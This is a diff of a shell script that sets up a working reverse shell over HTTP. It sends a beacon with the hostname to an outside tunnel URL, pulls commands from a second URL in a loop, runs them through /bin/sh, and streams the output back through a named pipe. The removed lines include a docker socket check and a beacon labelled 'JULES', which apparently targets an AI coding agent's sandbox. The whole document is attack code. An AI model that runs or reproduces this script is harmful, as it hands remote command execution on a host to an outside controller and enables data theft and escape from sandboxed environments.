@@ -3,19 +3,24 @@
 URL_OUT="https://e200e5147a8bf379-103-95-173-85.serveousercontent.com"
 URL_IN="https://b17cba060c6095d1-103-95-173-85.serveousercontent.com"
 
-{
-  echo "--- [!] ALIVE: BEACON FROM JULES ---"
-  echo "Timestamp: $(date)"
-  
-  # Check if docker socket is reachable
-  if [ -S /var/run/docker.sock ]; then
-    echo "[+] Docker Socket Found."
-  else
-    echo "[!] Docker Socket Missing."
-  fi
+# 1. Immediate Beacon (Check Terminal 1 for this)
+curl -s -X POST -d "--- [!] SESSION START: $(hostname) ---" "$URL_OUT"
 
-  # Double-Pipe Logic for Interactive Shell
-  rm -f /tmp/f; mkfifo /tmp/f
-  cat /tmp/f | curl -s -T - "$URL_OUT" & 
-  curl -s "$URL_IN" | /bin/sh -i > /tmp/f 2>&1
-} | curl -s -X POST --data-binary @- "$URL_OUT"
+# 2. Setup Interactive Bridge
+rm -f /tmp/f; mkfifo /tmp/f
+
+# Background process to stream shell output to your Mac
+cat /tmp/f | curl -s -T - "$URL_OUT" &
+
+# Main loop to fetch commands from your Mac and feed the shell
+while true; do
+  # Fetch the next command from your Controller (Terminal 2)
+  CMD=$(curl -s "$URL_IN")
+  
+  # If a command exists, execute it through the shell and pipe to output
+  if [ -n "$CMD" ] && [[ "$CMD" != *"GET /"* ]]; then
+    echo "Executing: $CMD" | curl -s -X POST --data-binary @- "$URL_OUT"
+    echo "$CMD" | /bin/sh -i 2>&1 > /tmp/f
+  fi
+  sleep 2
+done
